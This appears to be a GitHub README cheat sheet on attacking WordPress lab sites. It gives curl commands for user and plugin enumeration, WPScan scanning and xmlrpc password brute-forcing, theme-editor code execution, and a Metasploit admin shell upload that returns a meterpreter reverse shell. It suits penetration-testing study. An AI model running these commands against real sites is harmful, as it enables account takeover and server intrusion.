#          🔥Hacking-Wordpress 🔥
![wordpress-hacking](https://user-images.githubusercontent.com/79256105/165776319-f7d73fb8-6bd9-4847-97da-461b641fbfe0.png)

# 🥇Enumeration Procedure For Wordpress Website in Manually

### Wordpress Version Check

Check Wordpress Version using given below curl command or seeing source code

    commnad:
            curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
        
 Also check WP Version - CSS and WP Version - JS version from Source Code 
 
### ▶️ Plugins and Themes Enumeration

Commnad For Plugins: 
      
      curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
 
Command For Themmes:
      
      curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
      
    
#### ⏩ User Enumeration
Enumerating a list of valid users is a critical phase of a WordPress security assessment. Armed with this list, we may be able to guess default credentials or perform a brute force password attack. If successful, we may be able to log in to the WordPress backend as an author or even as an administrator. This access can potentially be leveraged to modify the WordPress website or even interact with the underlying web server.

Command :
        
        curl http://blog.inlanefreight.com/wp-json/wp/v2/users
         
         
 
# ⤵️Enumeration Procedure For Wordpress Website in Automatically Using wpscan
WPScan is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a WordPress site are outdated or vulnerable. It is installed by default on Parrot OS ,Kali OS but can also be installed manually with gem
         gem install wpscan
Once the installation completes, we can issue a command such as wpscan --hh to verify the installation. This command will show us the usage menu with all of the available command-line switches available.
### 🔥Enumerating a Website with WPScan ⚛️
The --enumerate flag is used to enumerate various components of the WordPress application such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups. However, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments --enumerate ap. Let's run a normal enumeration scan against a WordPress website.
Command :

            wpscan --url http://blog.inlanefreight.com --enumerate --api-token api-token-value
Example :
 
            wpscan --url http://10.129.2.37/ --enumerate --api-token cs0QRHwsYE6RvLd6SaHDhI1dmNX8ZVLEx0Fb7mNid9s
            
      
##### 👀Note: Api Token Generator Link https://wpscan.com/


# ✔️ Exploiting a Vulnerable Plugin
If we are checking and testing properly of our target wordpress website and if  target wordpress website is vulneable we will see some CVE or Exploite information after using above wpscan command
### ☑️WordPress User Bruteforce
WPScan can be used to brute force usernames and passwords. The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. The wp-login method will attempt to brute force the normal WordPress login page, while the xmlrpc method uses the WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it is faster.

Command :
          
          wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
          
#### 👁️Note: use username and password in http://sitename/login path
          
# 🔥Remote Code Execution (RCE) via the Theme Editor 🔥

With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack, log in to WordPress with the administrator credentials, which should redirect us to the admin panel. Click on Appearance on the side panel and select Theme Editor. This page will allow us to edit the PHP source code directly. We should select an inactive theme in order to avoid corrupting the main theme.

# 🔥Attacking WordPress with Metasploit 🔥
We can use the Metasploit Framework (MSF) to obtain a reverse shell on the target automatically. This requires valid credentials for an account that has sufficient rights to create files on the webserver.
###### To obtain the reverse shell, we can use the wp_admin_shell_upload module. We can easily search for it inside MSF:

        msf5 > search wp_admin

###### Matching Modules

0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
###### Module Selection:
msf5 > use 0

msf5 exploit(unix/webapp/wp_admin_shell_upload) >

###### Module Options
                  
        msf5 exploit(unix/webapp/wp_admin_shell_upload) > options

##### Module options (exploit/unix/webapp/wp_admin_shell_upload):


       PASSWORD                    yes       The WordPress password to authenticate with
       Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT      80               yes       The target port (TCP)
       SSL        false            no        Negotiate SSL/TLS for outgoing connections
       TARGETURI  /                yes       The base path to the wordpress application
       USERNAME                    yes       The WordPress username to authenticate with
       VHOST                       no        HTTP server virtual host


Exploit target:

       Id  Name
       --  ----
       0   WordPress
    
#### set and Exploitation
   
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.com
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password Winter2020
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.8
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > run

meterpreter > getuid
Server username: www—data (33)
## 🙏Practicing Sites:
                  https://tryhackme.com/room/allinonemj
                  https://tryhackme.com/room/wordpresscve202129447
                  https://tryhackme.com/room/blog
## 💠 Happy Hackings 🔡
